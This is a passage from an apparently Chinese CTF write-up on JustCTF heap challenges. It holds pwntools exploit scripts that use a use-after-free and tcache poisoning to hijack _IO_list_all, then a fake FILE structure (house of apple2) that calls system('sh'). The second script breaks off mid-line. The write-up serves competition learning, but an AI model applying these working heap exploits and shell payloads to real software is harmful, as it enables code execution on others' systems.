sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br><span class="hljs-comment">#p = remote(&quot;jctfcoin.nc.jctf.pro&quot;, 1337)</span><br><span class="hljs-comment">#p = remote(&quot;127.0.0.1&quot;,9999)</span><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>,stre(<span class="hljs-number">1</span>))<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>,stre(index))<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>,stre(size))<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>,stre(<span class="hljs-number">2</span>))<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>,stre(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>,stre(<span class="hljs-number">3</span>))<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>,stre(index))<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>,stre(<span class="hljs-number">4</span>))<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>,stre(index))<br><br><span class="hljs-comment">#gdbremote(get_pid(&quot;pwn&quot;))</span><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x190</span>,<span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x1D0</span>,<span class="hljs-string">b&quot;C&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;D&quot;</span>*<span class="hljs-number">0x8</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x421</span>))<br><br>dele(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x190</span>,<span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0x8</span>)<br><br>show(<span class="hljs-number">14</span>)<br>reu(<span class="hljs-string">b&quot;: &quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(re(<span class="hljs-number">15</span>),<span class="hljs-number">10</span>) - <span class="hljs-number">0x203b20</span><br>ph(libc_base,<span class="hljs-string">&quot;libc_base&quot;</span>)<br>IO_list_all = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_list_all&quot;</span>]<br>io_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele(<span class="hljs-number">4</span>)<br><br>show(<span class="hljs-number">14</span>)<br>reu(<span class="hljs-string">b&quot;: &quot;</span>)<br>key = <span class="hljs-built_in">int</span>(re(<span class="hljs-number">12</span>),<span class="hljs-number">10</span>)<br>heap_base = (key &lt;&lt; (<span class="hljs-number">8</span>+<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1000</span><br>ph(heap_base,<span class="hljs-string">&quot;heap_base&quot;</span>)<br><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;A&quot;</span>)<br><br>dele(<span class="hljs-number">5</span>)<br>dele(<span class="hljs-number">15</span>)<br><br>edit(<span class="hljs-number">14</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x41</span>) + p64((IO_list_all-<span class="hljs-number">0x10</span>)^key))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x20</span>,p64(heap_base + <span class="hljs-number">0x1710</span> + <span class="hljs-number">0x30</span> )) <span class="hljs-comment">#0x30</span><br><br>payload1 = p32(<span class="hljs-number">0xfffff7f5</span>) + <span class="hljs-string">b&quot;;sh\x00&quot;</span> + p64(<span class="hljs-number">0x0</span>)<br>fake_io_file = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>                     <br>fake_io_file+= p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) <br>fake_io_file+= <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x70</span> + p64(heap_base + <span class="hljs-number">0x1800</span> + <span class="hljs-number">0x30</span>) <span class="hljs-comment">#0x30</span><br>fake_io_file+= <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x30</span> + p64(io_wfile_jumps) <br>fake_io_file+= <span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">0xE0</span>) + p64(heap_base + <span class="hljs-number">0x1918</span> + <span class="hljs-number">0x30</span>) <span class="hljs-comment">#0x30</span><br>payload1+= fake_io_file<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload1)))<br><br>fake_io_file = <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x50</span> + p64(sys_addr)<br><br>payload2 = fake_io_file<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload2)))<br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x200</span>,payload1)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x200</span>,payload2)<br><br>sela(<span class="hljs-string">b&quot;: &quot;</span>,stre(<span class="hljs-number">6</span>))<br><br>op()<br></code></pre></td></tr></table></figure><h3 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h3><p>libc版本：Ubuntu GLIBC 2.39-0ubuntu8.5</p><p>check:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">[*] <span class="hljs-string">&#x27;/home/zlsf/tmp/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>ida:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">delete_chunk</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> index; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  index = get_index();<br>  <span class="hljs-keyword">if</span> ( *((_QWORD *)&amp;chunks + index) )<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;chunks + index));<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This chunk is empty&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>delete_chunk中存在uaf漏洞，程序只能申请和使用0x30大小的堆块，这道题比赛期间是我的队友完成的，所以我在此只描述一下我自己的思路。</p><p>我可能会泄漏堆地址和key后去打heap头的位置或者攻击其他chunk的size位释放来获得libc地址，拿到libc地址和heap基地址就没什么好说的了，劫持__IO_list_all后再堆上拼一个house of apple2即可完成getshell。</p><p>这里放我队友的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from struct import *</span><br><span class="hljs-comment">#from LibcSearcher import *</span><br><span class="hljs-comment">#from ctypes import CDLL</span><br><span class="hljs-comment">#from functools import reduce</span><br><span class="hljs-comment">#from z3 import *</span><br><span class="hljs-comment">#import gmpy2</span><br><span class="hljs-comment">#import base64</span><br><span class="hljs-comment">#import binascii</span><br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment">#import os</span><br><br>current_dir = os.getcwd()<br>arch = os.uname().machine<br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>    <span class="hljs-keyword">if</span> local == <span class="hljs-number">7</span>:<br>        command = [<span class="hljs-string">&quot;setarch&quot;</span>, arch, <span class="hljs-string">&quot;-R&quot;</span>, <span class="hljs-string">&quot;./pwn&quot;</span>]<br>        p = process(command)<br><span class="hljs-keyword">else</span>:<br>   <br>    p = remote(<span class="hljs-string">&#x27;baby-heap.nc.jctf.pro&#x27;</span>, <span class="hljs-number">1337</span>, timeout=<span class="hljs-number">300</span>)<br>    p.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, <span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><br>space = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> os.listdir(current_dir):<br>    <span class="hljs-keyword">if</span> item == <span class="hljs-string">&#x27;libc.so.6&#x27;</span> <span class="hljs-keyword">or</span> space == <span class="hljs-number">0</span>:<br>        libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>        success(<span class="hljs-string">&quot;成功加载LIBC文件...&quot;</span>)<br>time.sleep(<span class="hljs-number">0.2</span>)  <br><br><span class="hljs-keyword">if</span> elf.arch == <span class="hljs-string">&#x27;amd64&#x27;</span>:<br>    context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-keyword">if</span> elf.arch == <span class="hljs-string">&#x27;i386&#x27;</span>:<br>    context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ELF</span>(<span class="hljs-params">func_name</span>):<br>    <span class="hljs-built_in">globals</span>()[<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;func_name&#125;</span>_got&quot;</span>] = elf.got[func_name]<br>    <span class="hljs-built_in">globals</span>()[<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;func_name&#125;</span>_plt&quot;</span>] = elf.plt[func_name]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">GDB</span>(<span class="hljs-params">script=<span class="hljs-string">&quot;&quot;</span></span>):<br>    gdb.attach(p, gdbscript=script)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt64</span>():<br>    p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt32</span>():<br>    p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>), <span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">var</span>):<br>    var_name = [name <span class="hljs-keyword">for</span> name, value <span class="hljs-keyword">in</span> <span class="hljs-built_in">globals</span>().items() <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> var][<span class="hljs-number">0</span>]<br>    log.info(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;var_name&#125;</span>  &gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(var)&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">phlen</span>(<span class="hljs-params">var</span>):<br>    var_name = [name <span class="hljs-keyword">for</span> name, value <span class="hljs-keyword">in</span> <span class="hljs-built_in">globals</span>().items() <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> var][<span class="hljs-number">0</span>]<br>    log.info(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;var_name&#125;</span>(DEC)  &gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(var)&#125;</span>&quot;</span>)<br>    log.info(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;var_name&#125;</span>(HEX)  &gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(var))&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ELFlibc</span>(<span class="hljs-params">real_addr, func_name</span>):<br>    <span class="hljs-keyword">global</span> libc_base, system, binsh<br>    libc_base = real_addr - libc.symbols[func_name]<br>    system = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>    success(<span class="hljs-string">f&quot;libc_base  &gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Libcer</span>(<span class="hljs-params">real_addr, func_name</span>):<br>    <span class="hljs-keyword">global</span> libc_base, system, binsh<br>    libc = LibcSearcher(func_name, real_addr)<br>    libc_base = real_addr - libc.dump(func_name)<br>    system = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>    binsh = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>    success(<span class="hljs-string">f&quot;libc_base  &gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, content</span>):<br>    sla(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>) <br>    time.sleep(<span class="hljs-number">0.1</span>)   <br>    sla(<span class="hljs-string">b&quot;Index? &quot;</span>, <span class="hljs-built_in">str</span>(index).encode())  <br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    sa(<span class="hljs-string">b&quot;Content? &quot;</span>, content)  <br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    sla(<span class="hljs-string">b&quot;Index? &quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    sla(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    sla(<span class="hljs-string">b&quot;Index? &quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    sa(<span class="hljs-string">b&quot;Content? &quot;</span>, content)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    sla(<span class="hljs-string">b&quot;Index? &quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    sla(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br><br><br>sd = <span class="hljs-keyword">lambda</span> data: p.send(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data: p.sendafter(text, data)  <br>sl = <span class="hljs-keyword">lambda</span> data: p.sendline(data)<br>sla = <span class="hljs-keyword">lambda</span> text, data: p.sendlineafter(text, data)  <br>rc = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>: p.recv(num)<br>ru = <span class="hljs-keyword">lambda</span> a, b=<span class="hljs-literal">False</span>: p.recvuntil(a, drop=b)<br>rl = <span class="hljs-keyword">lambda</span>: p.recvline()<br>pr = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>: <span class="hljs-built_in">print</span>(p.recv(num))<br>l32 = <span class="hljs-keyword">lambda</span>: u32(p.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>l64 = <span class="hljs-keyword">lambda</span>: u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu32 = <span class="hljs-keyword">lambda</span>: u32(p.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span>: u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>int16 = <span class="hljs-keyword">lambda</span> data: <span class="hljs-built_in">int</span>(data, <span class="hljs-number">16</span>)<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>time.sleep(<span class="hljs-number">0.3</span>)  <br><br>key = uu64()<br>ph(key)<br>heap_base = key &lt;&lt; <span class="hljs-number">12</span><br>ph(heap_base)<br>add(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>add(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>add(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">1</span>)<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>free(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>, p64(key ^ (heap_base + <span class="hljs-number">0x2d0</span>)))<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>add(<span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p64(<span class="hljs-number">0x41</span> + <span class="hljs-number">0x40</span> + <span class="hljs-number">0x40</span>))<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>add(<span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">8</span>)<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>free(<span class="hljs-number">7</span>)<br>time.sleep(<span class="hljs-number">0.5</span>)  <br><br>edit(<span class="hljs-number">7</span>, p64((heap_base + <span class="hljs-number">0xa0</span> - <span class="hljs-number">0x20</span>) ^ key))<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>add(<span class="hljs-number">10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">11</span>, (<span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)*<span class="hljs-number">24</span>)<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>edit(<span class="hljs-number">11</span>, (<span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>free(<span class="hljs-number">8</span>)<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>free(<span class="hljs-number">7</span>)<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>edit(<span class="hljs-number">7</span>, p64((heap_base + <span class="hljs-number">0x10</span>) ^ 